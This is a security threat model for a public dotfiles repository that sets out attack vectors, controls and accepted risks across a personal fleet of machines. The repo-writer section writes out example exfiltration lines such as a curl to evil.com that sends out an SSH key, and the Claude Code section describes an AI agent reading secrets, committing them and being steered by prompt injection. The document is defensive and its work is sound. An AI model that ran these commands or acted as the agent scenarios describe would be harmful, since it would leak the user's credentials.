# Security Model

Security model for the dotfiles environment. Governs how credentials, secrets, and sensitive configuration are stored, transmitted, and accessed across Ted's fleet.

Referenced by [design.md](design.md), [use-cases.md](use-cases.md), and [secrets-lifecycle.md](secrets-lifecycle.md).

## Core Constraint

**This repo is public.** That single fact drives every security decision below.

No encrypted secret material may be committed to this repo. `age -p` passphrase mode reduces confidentiality to passphrase entropy against offline brute-force. Public ciphertext means unlimited, undetectable, parallelizable cracking attempts -- forever, from anywhere, with no detection. Git history makes mistakes durable: even deleted commits persist in forks, caches, mirrors, and CI artifacts. This constraint applies to `.age` bundles, encrypted tarballs, and any other ciphertext derived from secret material.

This is not a theoretical concern. The repo previously stored age-encrypted SSH keys and secrets bundles. Those were stripped from history and the credentials rotated. The lesson: "encrypted at rest in a public repo" is not a meaningful security property when the encryption is passphrase-based.

## Assets

| Asset | Sensitivity | Storage | Notes |
|-------|-------------|---------|-------|
| SSH private keys | High | `~/.ssh/`, 1Password, mount cache | Per-machine ed25519 keys; authenticate to Git registries and remote hosts |
| SSH public keys | Low | Repo (`.pub` sidecars), registries | Public by nature; committed for fingerprint validation |
| Secrets (PATs, URLs, credentials) | High | `~/secrets/`, 1Password, mount cache | Service tokens, calendar URL, netrc; per-machine subsets |
| Age passphrases | High | Operator memory / 1Password | Protect any locally-encrypted material; no escrow |
| Host inventory (hostnames) | Low | Repo (filenames, config) | Hostnames in `.pub` filenames and config; enables correlation |
| Deployment scripts | High (integrity) | Repo | `update-env`, `init.bash`, nix expressions. Execute with full user privileges on every machine. Compromise = arbitrary code execution across the fleet |
| Shell config, nix config | None | Repo | Public; no secrets in config files |

## Threat Actors

The following threat actors and attack vectors are the ones this security model specifically addresses. This is not an exhaustive enumeration -- new vectors may emerge from platform changes, tool updates, or workflow evolution. The model should be reviewed and extended when any of these change.

### Internet (repo reader)

**Access:** clone, fork, cache, or mirror repo contents indefinitely.

**Attack vectors:**

*Ciphertext cracking (historical):* The repo previously contained `ssh/id_ed25519_calderon.age` and `secrets/calderon.tar.age`. These were stripped from history and credentials rotated. If any fork, mirror, CI cache, or GitHub CDN edge server retained the objects before GC, an attacker could brute-force the age passphrase offline. Age uses scrypt (N=2^18, r=8, p=1), which at ~0.1s/guess on commodity hardware yields ~860k guesses/day. A 4-word diceware passphrase (~51 bits) falls in weeks on a GPU cluster. A 20-character random passphrase (~128 bits) is computationally infeasible. The passphrase strength was the entire security boundary.

*Reconnaissance from committed config:* The repo exposes:
- `.pub` sidecars: key fingerprints correlatable across GitHub/Codeberg/Bitbucket SSH key settings pages (public on most registries). Fingerprint -> username -> account enumeration.
- Hostnames in `.pub` filenames and `$CrostiniDir/hostname` references: machine inventory.
- `contexts/crostini/home.nix` PAC file: internal corporate hostnames (`stash.digi.com`, `nexus.digi.com`, `dm1.devdevicecloud.com`, `gitlab.drm.ninja`), VPN gateway name ("US East"), and CIDR ranges (`10.0.0.0/8`, `172.26.0.0/16`). This is a map of the employer's internal infrastructure.
- `scripts/vpn-connect`: GlobalProtect gateway configuration, split-tunnel routing rules, `/etc/hosts` entries for internal services.
- `update-env`: project repo names and URLs (`jeeves`, `sofdevsim-2026`, `era`, etc.), Bitbucket Server hostname, Confluence hostname.
- `~/secrets/` consumer audit in `secrets-lifecycle.md`: enumerates what secret files exist and what they're used for.

*Git history mining:* Force-push removes refs but GitHub retains unreferenced objects for ~90 days before GC. During that window, anyone with a prior clone or fork has permanent access. GitHub's Events API may also expose commit SHAs that remain fetchable by hash even after ref deletion.

**Mitigations:**
- No encrypted secret material in the repo (core constraint).
- `.pub` metadata leakage accepted as low-severity for a personal repo.
- Corporate infrastructure exposure in PAC/VPN config is a known information leak; acceptable because the hostnames are already discoverable via DNS and the config is required for the VPN to function.
- Credentials rotated after any accidental commit; history rewritten and force-pushed.

### Repo writer / supply chain

**Access:** modify committed files via GitHub account compromise, GitHub infrastructure compromise, or dependency supply chain.

**Attack vectors:**

*Code injection via update-env:* An attacker who can push to the repo injects a payload into `update-env`. On the next `update-env` run on any machine, the payload executes as Ted. Concrete targets:
- Add `curl https://evil.com/exfil -d @$HOME/.ssh/id_ed25519` to any function that runs during stage 1. The key is exfiltrated before auth preflight.
- Modify `loadSshKey` to capture the SSH passphrase from the TTY prompt (replace `keychain --eval` with a wrapper that logs the passphrase, then calls keychain).
- Add a nix derivation to `shared.nix` that runs a postinstall script. This executes during `home-manager switch` on every platform.

*Code injection via init.bash:* Modifying `bash/init.bash` or any `bash/apps/*/init.bash` runs payload code on every interactive shell start across the fleet. Unlike `update-env` (run deliberately), init.bash runs automatically. An attacker could add `source <(curl -s https://evil.com/payload)` to a sourced file.

*Nix supply chain:* Modify `flake.lock` to point a `flake = false` input (task.bash, mk.bash, tesht) to a compromised commit. The hash change is visible in the lock diff but easy to miss in a large commit. The compromised code runs when nix builds the derivation.

*.pub sidecar replacement:* Replace `ssh/id_ed25519_<hostname>.pub` with the attacker's public key. On next cache restore, fingerprint validation passes against the attacker's `.pub`. The cache key (which is the real key) doesn't match, so restore fails -- but the error message says "fingerprint mismatch," which could lead Ted to trust the repo `.pub` and discard the legitimate local key.

*Bootstrap attack:* On a bare machine, Ted runs `git clone https://github.com/binaryphile/dotfiles && cd dotfiles && ./update-env -1 calderon`. This is unauthenticated HTTPS -- no signature verification, no content hash check. A DNS hijack, BGP hijack, or compromised GitHub CDN edge could serve a modified repo. `update-env` then runs with full user privileges: installs packages (nix, apt), writes to `~/.ssh/`, manages credentials, clones repos. The attack surface is ~1800 lines of bash.

**Mitigations:**
- GitHub account security (2FA, SSH key auth).
- Fingerprint validation against repo `.pub` is self-consistency, not authenticity. It detects accidental corruption but not targeted repo modification.
- Nix flake lock pins dependency hashes. `nix flake update` is a deliberate action. Lock file diffs are reviewable.
- Subsequent pulls use SSH transport (after credential restore), adding transport-layer authentication that HTTPS clones lack.
- Ted is the sole committer; any commit not authored by Ted in `git log` is a signal.

**Accepted gap:** no independent trust anchor for repo content integrity. First clone is unauthenticated HTTPS. Integrity depends on GitHub account and transport security.

### Local user / malware in container

**Access:** read local filesystem, process memory, environment variables, shell history. Same UID as Ted (single-user container).

**Attack vectors:**

*Direct file read:*
- `cat ~/.ssh/id_ed25519` -- private key, `chmod 600` but same-user access bypasses permission.
- `cat ~/secrets/*` -- all service tokens, calendar URL, netrc credentials.
- `cat $CrostiniDir/ssh/*/id_ed25519` -- cached plaintext keys (if Crostini).

*SSH agent hijack:*
- `SSH_AUTH_SOCK` is set by keychain and inherited by all processes. Any process running as Ted can connect to the agent and use loaded keys to SSH to any registered host (GitHub, Codeberg, Bitbucket, Stash) without possessing the private key. `ssh -T git@github.com` succeeds without the key file.
- Agent forwarding is disabled by default (`ForwardAgent no` in ssh config), limiting this to local use. But local use includes pushing to repos, which is the primary credential value.

*Process memory / procfs:*
- During `update-env` execution: staging directories contain plaintext keys for a brief window. Attacker can poll `/proc/<pid>/fd/` or race `mktemp` to read staging dir contents before cleanup traps fire.
- `scripts/with-secret` injects secrets into child process environment: `cat /proc/<pid>/environ` exposes the secret for the lifetime of the child process.
- During `age -p` passphrase entry: age reads from `/dev/tty`, so the passphrase doesn't appear in argv or shell history. But it transits process memory, where it could be read via `ptrace` or `/proc/<pid>/mem`.

*Swap and core dumps:*
- If swap is enabled, any in-memory secret (passphrase, decrypted key, agent socket data) may be written to swap and persist after the process exits. `ulimit -c` defaults allow core dumps that could capture process memory snapshots.

*Persistence via init chain:*
- `init.bash` sources `hm-session-vars.sh`, `context/init.bash`, all `bash/apps/*/init.bash`, and all `bash/apps/*/cmds.bash`. A malware that can write to any of these paths (they're symlinks into `~/dotfiles/`, which is writable) gets code execution on every shell start. The modification would be visible in `git status` but not if the attacker also stages and commits it.

**Mitigations:**
- File permissions (`chmod 600` on private keys, `chmod 700` on staging dirs) -- defense-in-depth against accidental exposure only.
- `SSH_ASKPASS_REQUIRE=never` prevents askpass fallback from leaking prompts to unexpected processes.
- `age -p` prompts on TTY; passphrase does not appear in process argv or shell history.
- Staging directories use `mktemp` with signal traps (`withCleanupTrap`) for cleanup on INT/TERM.

*NixOS-specific vectors:*
- NixOS is a multi-user system (unlike single-user Crostini containers). Other users or system services could access Ted's files if permissions are misconfigured. However, NixOS uses proper Unix multi-user isolation -- `~/.ssh/` at mode 700 is meaningful here, unlike Crostini's single-user container.
- systemd journal may capture stdout/stderr from user services (khal-notify, vdirsyncer). If a service logs secret-adjacent data, `journalctl --user` exposes it to same-user processes and `journalctl` exposes it to root.
- Swap is typically enabled on NixOS workstations. Encrypted swap (LUKS) protects at rest but not against a running attacker with root access.
- Sway/Wayland clipboard (`wl-copy`/`wl-paste`): if Ted copies a passphrase from 1Password to the clipboard, it's accessible to any Wayland client until overwritten. `cliphist` (clipboard history) persists clipboard entries to disk.
- The nix store (`/nix/store/`) is world-readable by design. Secrets must never appear in derivation outputs. `home.sessionVariables` values are written to `hm-session-vars.sh` in the store -- these must not contain secrets (they don't; secrets are file-based via `~/secrets/`).

**Accepted gap:** a compromised same-user process has full access to all local plaintext, agent socket, and process memory. On Crostini, file permissions are not a meaningful security boundary (single-user container). On NixOS, multi-user isolation provides defense-in-depth against other users but not against same-user compromise or root.

### ChromeOS host / shared-mount consumer

**Access:** read/write `$CrostiniDir` at `/mnt/chromeos/MyFiles/Downloads/crostini/` from the ChromeOS host side.

**Attack vectors:**

*Direct file read from host side:*
- ChromeOS Files app can browse `MyFiles/Downloads/crostini/ssh/<hostname>/id_ed25519` and `MyFiles/Downloads/crostini/secrets/<hostname>/` in a GUI file browser.
- The FUSE bridge (via `seneschal`/`9p`) translates container file permissions but the host-side enforcement depends on Chrome's virtual filesystem layer. `chmod 600` inside the container may not prevent read access from the host side, especially for processes running as the `chronos` user.

*Chrome extension exfiltration:*
- Any Chrome extension with `"permissions": ["fileSystem"]` or access to the Downloads directory can read the mount cache. Extensions are auto-updated by Google; a compromised extension update could add exfiltration silently. Ted cannot audit or control extension updates on ChromeOS.

*Android app access:*
- Android apps with `READ_EXTERNAL_STORAGE` or scoped storage access to Downloads can read `MyFiles/Downloads/crostini/`. The Play Store runs on ChromeOS and installed Android apps share the MyFiles filesystem.

*Google backup/sync:*
- ChromeOS may include `MyFiles/Downloads/` content in Google Drive backup (depends on backup settings). If enabled, plaintext keys and secrets are uploaded to Google's servers. Credential rotation locally doesn't affect already-synced copies.
- Google Takeout exports include Drive contents, creating another copy.

*Physical access:*
- Chromebooks in developer mode expose the root filesystem via removable media boot or `crosh` shell. The `chronos` user can read all of MyFiles. Even without developer mode, physical access to an unlocked Chromebook provides Files app access.

**Mitigations:**
- ChromeOS user session isolation (login password / PIN) -- prevents access from a locked device.
- Cache is populated only after credential restore; an empty cache leaks nothing.
- Cache invalidation procedure documented ([secrets-lifecycle.md](secrets-lifecycle.md#cache-invalidation)).

**Accepted tradeoff:** the mount cache stores plaintext on host-visible storage. This is the cost of passphrase-free restore after container reset (the common Crostini recovery path). Ted has no admin access to the ChromeOS host, limiting mitigation options. The alternative -- requiring a passphrase on every container reset -- would make Chromebooks significantly less usable as disposable machines.

### Claude Code

**Access:** full filesystem read/write, git operations, shell command execution. Runs as Ted's user with no sandboxing beyond advisory CLAUDE.md instructions.

**Attack vectors:**

*Direct secret read:*
- `Read("/home/ted/.ssh/id_ed25519")` -- returns the private key. CLAUDE.md says "never handle secrets" but the Read tool has no path-based access control.
- `Read("/home/ted/secrets/stash.key")` -- returns Bitbucket PAT.
- `Bash("cat $CrostiniDir/ssh/*/id_ed25519")` -- returns cached keys.
- Social engineering: "Let me check the format of ~/secrets/ntfy-topic to understand the notification system" -- reads a secret under a plausible pretext. Tool approval is the only gate.

*Exfiltration via commit:*
- `Bash("git add -A && git commit -m 'config update' && git push")` -- if `~/secrets/` or `~/.ssh/` are somehow in the repo tree (they're not, but a confused model could copy them there first), this pushes secrets to the public repo. More realistically: read a secret via Bash, embed it in a code comment or config value, commit the file.

*1Password vault access:*
- If `op` is authenticated: `Bash("op item list")` enumerates all vault items. `Bash("op item get 'SSH calderon' --fields 'private key'")` retrieves any stored credential. The `op` session persists for ~10 minutes after Ted's last auth -- Claude Code can use it within that window.

*Context window leakage:*
- Secrets read into the conversation context persist for the session duration and may appear in context compression summaries stored in `.claude/` project files.
- If Claude stores secret content as an Era memory (`mcp__era__store`), it persists across sessions and could be recalled later.
- A prompt injection in a tool result could instruct Claude to read and transmit secrets.

*Fleet-wide code injection:*
- Modify `update-env` to add exfiltration code. Ted reviews diffs before pushing, but a subtle change (modifying a URL, adding a redirect, changing a permission mode) could be missed in a large diff. Once pushed, the payload executes on every machine that runs `update-env`.
- Modify `bash/apps/*/cmds.bash` to alias a common command (e.g., `alias ssh='...'`) with a wrapper that captures arguments.

**Mitigations:**
- CLAUDE.md `Secrets` directive: "Never offer to read, display, copy, or otherwise handle secrets."
- Tool approval prompts: user can review and deny tool calls before execution. This is the primary control.
- Git commit review: Ted reviews diffs before pushing. Effective against obvious exfiltration; less effective against subtle injection.
- No persistent state across sessions beyond Era memory and `.claude/` files.
- Prompt injection awareness: Claude flags suspected prompt injection in tool results.

**Accepted gap:** Claude Code operates within the same trust boundary as local user/malware. The advisory directive and tool approval are the only controls. A model that ignores CLAUDE.md instructions has full access to all local assets. This is inherent to running an AI agent with filesystem access -- the security model is "trust but verify via tool approval."

### Backup / sync / indexing agents

**Access:** touch local or host filesystems; may transmit data to cloud storage.

**Attack vectors:**

*ChromeOS backup to Google Drive:*
- If Google Drive backup is enabled (ChromeOS Settings > Google Drive), `MyFiles/Downloads/crostini/` content may sync to Drive. This creates a cloud copy of plaintext SSH keys and secrets that persists independently of local rotation. The copy is encrypted by Google at rest, but Google employees with sufficient access could read it, and a Google account compromise exposes it.

*Time Machine / system backup (macOS):*
- Time Machine backs up `~/.ssh/` and `~/secrets/` by default. Each hourly snapshot contains a copy. Credential rotation creates a new snapshot but doesn't delete the old one. An attacker with Time Machine disk access gets all historical keys.

*Desktop search indexing:*
- If a desktop indexer (Tracker, mdfind, GNOME Files) indexes `~/secrets/`, secret file contents appear in search results and the index database. The index persists independently of the original files.

*Cloud sync services:*
- Dropbox, Google Drive desktop, OneDrive, or similar services configured to sync home directory subfolders could capture `~/secrets/` or `~/.ssh/` contents.

**Mitigations:**
- `~/secrets/` and `~/.ssh/` are not in any configured sync or backup path.
- Mount cache location (`MyFiles/Downloads/crostini/`) may be included in ChromeOS backup -- this is an accepted risk.
- macOS: `~/secrets/` and `~/.ssh/` could be added to Time Machine exclusions, but this is not automated.
- No automated scanning for backup agent exposure.

**Accepted gap:** no systematic protection against backup capture. Relies on not configuring backup agents to include sensitive paths. The ChromeOS backup question is not fully characterized -- the default behavior for `MyFiles/Downloads/` backup is not documented here.

## Execution and Privilege Map

Code-grounded analysis of what executes, when, as whom, from which file, with what trust assumptions. This is the foundation for the threat model -- every attack vector traces back to one of these execution points.

### update-env privilege transitions

`update-env` runs as Ted's user. It escalates to root in exactly one place:

| Line | Command | Privilege | Input | Context |
|------|---------|-----------|-------|---------|
| 446 | `sudo dpkg -i "$tmp/$deb"` | root | Downloaded `.deb` from GitHub Releases (version hardcoded) | gpoc install, Crostini only |
| 446 | `sudo apt-get install -f -y` | root | None (fallback) | APT dependency repair |
| 747 | `sudo chown -R -- $user:$group /nix` | root | `$(id -u)`:$(id -g)` (numeric), hardcoded `/nix` | Fix nix dir ownership |

All other operations run as Ted. The `sudo` surface is small but includes an unsigned binary install (gpoc `.deb`).

### update-env eval calls

Every `eval` in the script, with input source and trust level:

| Line | Input | Source | Trust | Risk |
|------|-------|--------|-------|------|
| 1345 | `$(SSH_ASKPASS_REQUIRE=never $keychain --eval id_ed25519)` | `keychain` command output | PATH-dependent | `keychain` is not invoked by absolute path. In production, `$keychain` is hardcoded to `keychain`; in test mode (`DOTFILES_TEST=1`), it's injectable via env. |
| 1643 | `"$command $arg"` (in `each`) | Caller-supplied command + stdin lines | Repo-controlled | `$arg` is unquoted in the eval. Safe when input is controlled (repo filenames, heredoc literals), but structurally fragile -- shell metacharacters in input would execute. |
| 1664 | `"echo \"$EXPRESSION\""` (in `map`) | Caller-supplied expression template | Repo-controlled | Expression is a single-quoted literal in all call sites. `$()` or backticks in the expression would execute. Safe only because callers are trusted. |
| 880-881 | `"${prevInt:-trap - INT}"` (in `withCleanupTrap`) | `trap -p` output | Shell-internal | Restores previous trap handlers. Input is bash's own `trap -p` output -- safe. |
| 1613 | `"$prevOpts_"` (in `loosely`) | `set +o` output | Shell-internal | Restores shell options. Input is bash's own `set +o` output -- safe. |

The `curl | eval` fallback for `lib.bash` (previously the widest code-injection surface) has been removed. The script now requires being run from the cloned repo.

### update-env network fetches

Every external download, with verification status:

| Line | URL | Method | Verification | Executes as |
|------|-----|--------|--------------|-------------|
| 1688 | `raw.githubusercontent.com/.../task.bash` (pinned commit) | `curl > tmp; source tmp` | Commit hash in URL (no cryptographic verification) | User (sourced) |
| 733 | `install.lix.systems/lix` | `curl \| sh -s` | None | User (sh subprocess, but installs to /nix) |
| 442 | `github.com/.../globalprotect-openconnect/.../v$version/$deb` | `curl > tmp; sudo dpkg -i` | SHA-256 verified against pinned hash | **Root** (dpkg) |
| 389 | `raw.githubusercontent.com/.../vim-plug/.../plug.vim` | `curl > file` | None | Not executed directly |

The `lib.bash` curl|eval fallback has been removed (was dead code in normal operation). The gpoc `.deb` download is now SHA-256 verified before root installation.

### update-env secret materialization

Exact moments secrets appear in cleartext on disk or in memory:

| Line | Secret | Form | Location | Duration | Permissions |
|------|--------|------|----------|----------|-------------|
| 1120-1142 | SSH private key | Plaintext | `~/.ssh/.stage.XXXXXX/` (mktemp -d, mode 700) | Decryption through install (~seconds) | 700 (dir), 600 (file via tar) |
| 1138 | SSH private key | Plaintext | `$CrostiniDir/ssh/<hostname>/` | Persistent (cache) | 600 (file); dir permissions depend on shared mount |
| 967-1010 | SSH private key | Plaintext | `~/.ssh/id_ed25519` | Persistent (operational) | 600 |
| 1289-1302 | Secrets bundle | Decrypted tar | `~/secrets.bundle.XXXXXX` (mktemp, mode 600) | Decryption through extraction (~seconds) | 600 |
| 1299-1314 | Individual secrets | Plaintext files | `~/secrets.stage.XXXXXX/` (mktemp -d, mode 700) | Extraction through move (~seconds) | 700 (dir), 600 (files) |
| 1318-1323 | Individual secrets | Plaintext files | `$CrostiniDir/secrets/<hostname>/` | Persistent (cache) | 700 (dir), 600 (files); shared mount caveats |
| permanent | Individual secrets | Plaintext files | `~/secrets/` | Persistent (operational) | 700 (dir), 600 (files) |
| 550 | Bitbucket PAT | Env var | `.envrc` file + shell environment | Shell session lifetime | File: default umask; env: process memory |
| 555 | Confluence PAT | Env var | `.envrc` file + shell environment | Shell session lifetime | Same |
| 1345 | SSH key passphrase | TTY input | Process memory only | keychain invocation | N/A (not on disk) |

**Secret in environment (lines 550, 555):** the `.envrc` for the urma project exports `BITBUCKET_PERSONAL_TOKEN` and `CONFLUENCE_PERSONAL_TOKEN` as environment variables. These are:
- Visible in `/proc/<pid>/environ` to same-user processes
- Inherited by all child processes in the shell session
- Present for the entire direnv session (not just one command)
- Acknowledged in the code (line 545-547 comment) as a tradeoff for MCP plugin compatibility

### bash/init.bash sourcing chain

Every file sourced during shell startup, in order:

| Order | File | Guard | Eval? | Trust |
|-------|------|-------|-------|-------|
| 1 | `lib/initutil.bash` | None | No | Repo-controlled |
| 2 | `~/.nix-profile/.../hm-session-vars.sh` or `/etc/profiles/...` | Login or reload | No | Nix-managed (store path) |
| 3 | `context/init.bash` | `TestAndSource` (file exists) | No | Repo-controlled |
| 4 | `apps/keychain/init.bash` | Login or reload | **Yes**: `eval "$(keychain --eval ...)"` | `keychain` found via PATH |
| 5 | `$(command -v liquidprompt)` | Interactive + command exists | No | Found via PATH |
| 6 | `liquidprompt/liquid.theme` | Interactive + file readable | No | Repo-controlled |
| 7 | `apps/direnv/init.bash` | Interactive | **Yes**: `eval "$(direnv export bash)"` on every prompt | `direnv` found via PATH |
| 8 | `settings/base.bash` | None | No | Repo-controlled |
| 9 | `settings/cmds.bash` | None | No | Repo-controlled |
| 10 | `apps/*/cmds.bash` (glob) | Interactive | No | Repo-controlled |
| 11 | `settings/interactive.bash` | Interactive | No | Repo-controlled |
| 12 | `settings/login.bash` | Interactive login or reload | No | Repo-controlled |

**PATH-dependent commands:** `keychain` (step 4), `liquidprompt` (step 5), and `direnv` (step 7) are all found via `command -v` -- not by absolute path. An attacker who can prepend to `PATH` before shell init runs can substitute malicious versions. In practice, PATH is set by `hm-session-vars.sh` (step 2) which runs before the PATH-dependent steps, and nix-managed binaries are in `/nix/store/` paths. But if `~/.local/bin/` or similar user-writable directories appear in PATH before nix paths, they're exploitable.

**Eval surface:** two eval calls run on every shell start:
- `keychain --eval` (login only): outputs `SSH_AUTH_SOCK=...; SSH_AGENT_PID=...; export ...`. If `keychain` is replaced, arbitrary code executes on every login.
- `direnv export bash` (every prompt): outputs environment variable assignments. If `direnv` is replaced, arbitrary code executes on every prompt. Additionally, `direnv` evaluates `.envrc` files in the current directory -- a malicious `.envrc` in any project directory executes code when Ted enters that directory (mitigated by `direnv allow` requirement).

### Nix/home-manager secret boundary

Nix store paths (`/nix/store/`) are world-readable by design. Secrets must never appear in:
- Derivation outputs (built artifacts in the store)
- `home.sessionVariables` values (written to `hm-session-vars.sh` in the store)
- `home.file` source content (copied or symlinked from the store)
- `programs.*` configuration values (rendered into store-path config files)
- `systemd.user.services` `Environment=` directives (visible in unit files and journal)

Current implementation is correct: secrets are file-based (`~/secrets/`), read at runtime by consumers, never interpolated into nix expressions. The `.envrc` secret export (lines 550, 555) is generated by `update-env` at runtime, not by nix.

## Trust Boundaries

```
+---------------------------+
|  1Password                |  High trust: vault encryption + master password + 2FA
|  (SSH keys, secrets)      |  + server-side rate limiting
+---------------------------+
            |
            | op CLI (authenticated session)
            v
+---------------------------+      git clone/pull       +---------------------------+
|  Local filesystem         |  <--------------------   |  Public repo (GitHub)     |
|  ~/.ssh/, ~/secrets/      |                          |  Code, config, .pub only  |
|  Medium trust             |   git push (.pub only)   |  Zero trust for secrets   |
|                           |  -------------------->   |                           |
+---------------------------+                          +---------------------------+
            |
            | cp (Crostini only)
            v
+---------------------------+
|  ChromeOS shared mount    |  Low trust: host-visible, POSIX modes unreliable
|  $CrostiniDir/ssh/        |  Accessible to extensions, Android, backups
|  $CrostiniDir/secrets/    |
+---------------------------+
```

**Flow rules:**
- 1Password -> local: private keys and secrets (via `op` CLI or manual retrieval)
- Repo -> local: code, config, `.pub` sidecars (via git clone/pull)
- Local -> repo: `.pub` sidecars only. Never private keys, ciphertext, or secrets.
- Local -> cache: plaintext copies for passphrase-free restore (Crostini only)
- Cache -> local: plaintext restore on container reset
- Nothing ever flows from local/cache -> 1Password automatically. Ted stores credentials manually (or via `op` CLI).

## Confidentiality Model

### 1Password as primary backup store

1Password replaces the repo as the durable store for private key material and secrets. This eliminates the passphrase-entropy-as-sole-control problem:

| Property | age -p in public repo | 1Password |
|----------|----------------------|-----------|
| Offline attack surface | Unlimited, forever | None (no public ciphertext) |
| Authentication | Single passphrase | Master password + 2FA + device trust |
| Rate limiting | None | Server-side lockout |
| Breach detection | None | Account activity audit log |
| Key rotation | Re-encrypt + commit + history rewrite | Update vault item |

The `op` CLI enables programmatic retrieval during `update-env` after initial authentication. Session tokens are cached in memory for 10 minutes (biometric) or until explicit signout.

**1Password as a dependency:** the system's durability now depends on 1Password availability. Failure modes:
- **Account lockout** (forgotten master password, lost 2FA device): credentials irrecoverable from 1Password. Mitigated by mount cache (Crostini) and local copies -- as long as at least one machine has plaintext, a new vault item can be created.
- **Service outage:** temporary inability to retrieve credentials. Mitigated by local copies and cache; only affects bare-machine bootstrap.
- **1Password breach:** attacker gains vault contents. Triggers full credential rotation (SSH keys, all secrets, all PATs). This is a catastrophic scenario but substantially harder to execute than brute-forcing a public age-encrypted file.

**`op` CLI security properties:**
- Session tokens are held in memory by the `op` daemon, not written to disk or exposed via argv.
- An authenticated `op` session on a compromised machine gives the attacker access to vault contents for the session duration (~10 minutes). This is comparable to the exposure of having plaintext on disk -- the attacker who can read `op`'s memory can also read `~/.ssh/`.
- `op` does not cache decrypted vault contents on disk (decryption happens in memory or server-side).

### Passphrase requirements

Any material still encrypted with `age -p` (local-only backups, ad hoc exports) must use a high-entropy passphrase from a password manager generator. Age uses scrypt internally, which slows attacks by a constant factor -- it does not prevent them. Against a weak passphrase, scrypt buys hours or days, not years.

**Minimum:** 128-bit entropy passphrase (e.g., 1Password "random password" generator at 20+ characters, or a 10+ word diceware passphrase).

**Never** use `age -p` for material that will be stored in a public or shared location. Use 1Password instead.

### What remains locally encrypted

Age encryption is still used for:
- **`scripts/encrypt-secrets`** -- bundles `~/secrets/` into an age-encrypted tarball for export or local backup. Not committed to the repo.
- **Local-only ad hoc encryption** -- temporary exports, one-off transfers between machines

These use cases are acceptable because the ciphertext never leaves local or host-visible storage.

**Note:** the Crostini mount cache stores *plaintext*, not encrypted material. This is intentional -- the cache exists for passphrase-free restore, which requires plaintext. The trust boundary for the cache is ChromeOS session isolation, not encryption (see [ChromeOS host](#chromeos-host--shared-mount-consumer)).

## Integrity / Authenticity Model

### Fingerprint validation

The repo `.pub` sidecar enables fingerprint validation: when restoring a key from cache, its fingerprint is compared against the repo `.pub`. This catches accidental corruption and key/hostname mismatches.

**Limitation:** this is a self-consistency check, not an authenticity guarantee. An attacker who can modify the repo can replace both the `.pub` sidecar and any other validation data. The check answers "does this key match what the repo says?" -- not "is the repo telling the truth?"

### Repo content integrity

Repo integrity relies on:
- **SSH commit signing** -- all commits are signed with a per-machine signing key (`~/.ssh/id_ed25519_signing`), separate from the auth key per crypto practice (keys are not reused across purposes). Signing keys are stored in 1Password and restored by `update-env`. `git log --show-signature` verifies authorship. Unsigned or foreign-signed commits are a signal of compromise.
- **GitHub branch protection** -- `main` requires signed commits and disallows force-push. History cannot be rewritten (except via the emergency procedure in [Incident Response](#secret-committed-to-public-repo), which requires temporarily disabling protection).
- **GitHub account security** (2FA, SSH key auth).
- **SSH transport authentication** (host key TOFU; first clone is HTTPS without content verification).

A compromised repo means arbitrary code execution on every machine that runs `update-env` or sources `init.bash`. The attack surface is large: `update-env` is ~1800 lines of bash that runs `eval`, installs packages, and manages credentials.

**Remaining gap:** the first clone on a bare machine is unauthenticated HTTPS. Signed commits protect against unauthorized pushes but do not make the initial checkout self-authenticating -- a normal `git clone` does not verify commit signatures. Subsequent pulls use SSH transport. A stronger option (verify a signed tag before running `update-env`) is available but not yet implemented.

### Host key trust

TOFU (Trust On First Use): `StrictHostKeyChecking=accept-new` accepts unknown host keys on first contact, rejects changed keys on subsequent connections. This prevents interactive prompts during bootstrap while catching MITM attacks on established connections.

**Limitation:** first contact on a fresh machine trusts the network path. An attacker who controls the network during initial SSH setup can inject a host key that persists. Acceptable for personal use; mitigated by using known-good networks for initial setup.

## Accepted Risks

| Risk | Severity | Rationale |
|------|----------|-----------|
| Bootstrap clone is unauthenticated HTTPS | High | First clone on a bare machine has no content verification. Mitigated by cloning on trusted networks; subsequent pulls use SSH |
| `.pub` metadata leakage (hostnames, fingerprints) | Low | Public keys are public; host inventory of a personal fleet has minimal adversarial value |
| Mount cache plaintext on ChromeOS host | Medium | Required for usable Crostini restore; ChromeOS session isolation is the boundary |
| First clone unauthenticated (commit signatures not verified on clone) | Medium | Signed commits protect pushes but not initial checkout. Mitigated by cloning on trusted networks |
| TOFU host keys on first contact | Low | Initial setup on trusted networks; changed keys rejected afterward |
| No backup agent exclusion enforcement | Low | Relies on not configuring backups to include sensitive paths |
| ssh-agent socket accessible to local processes | Medium | Standard SSH model; agent forwarding disabled by default |
| 1Password as single durable store | Medium | Account lockout or service outage blocks bare-machine bootstrap. Mitigated by local copies and cache on existing machines |
| Claude Code has full local access | Medium | Advisory CLAUDE.md directive + tool approval are the only controls. Accepted as inherent to AI-assisted development |

## Controls Summary

| Control | What it protects | Mechanism |
|---------|-----------------|-----------|
| 1Password vault | SSH keys, secrets at rest | Vault encryption + master password + 2FA |
| `op` CLI session | In-transit retrieval | Biometric/password auth, 10-min memory cache |
| File permissions | Local plaintext | `chmod 600` (keys), `chmod 700` (dirs) |
| Signal traps | Temp file cleanup | `withCleanupTrap` in `update-env` |
| `SSH_ASKPASS_REQUIRE=never` | Askpass fallback | Prevents broken nix askpass from leaking prompts |
| `.gitignore` | Accidental commit | Advisory; blocks `git add` for private key patterns |
| Fingerprint validation | Key/hostname mismatch | Self-consistency check against repo `.pub` |
| TOFU host keys | MITM on established connections | `accept-new` policy in SSH config |
| SHA-256 hash verification | Downloaded binaries | Pinned hash checked before execution/install (gpoc .deb) |
| SSH commit signing | Commit authorship | Per-machine signing key (separate from auth key); unsigned commits rejected by GitHub |
| Branch protection | Repo integrity | Require signed commits on `main`, disallow force-push |
| History rewrite + rotation | Past exposure | Strip + force-push + credential rotation after incidents |
| CLAUDE.md secrets directive | AI agent secret access | Advisory; instructs Claude Code not to read/display/handle secrets |
| Tool approval prompts | AI agent actions | User reviews tool calls before execution; can deny |

## Incident Response

### Secret committed to public repo

1. **Rotate immediately.** The credential is compromised the moment it's pushed, regardless of how quickly it's removed. Assume it was scraped.
2. Temporarily disable force-push protection on `main` (GitHub Settings > Branches)
3. Strip from history: `git filter-repo --invert-paths --path-glob '<pattern>' --force`
4. Force-push: `git push --force origin main`
5. Re-enable force-push protection
6. Rotate all affected credentials (SSH keys: UC-4a; secrets: UC-4b)
7. Audit: check GitHub Security tab for any forks that captured the commit
8. Update this doc if the incident reveals a new threat or control gap

### 1Password account compromise

1. Change master password and revoke all sessions via 1Password web
2. Rotate all SSH keys (UC-4a on every machine)
3. Rotate all secrets (UC-4b)
4. Deregister old SSH keys from all registries
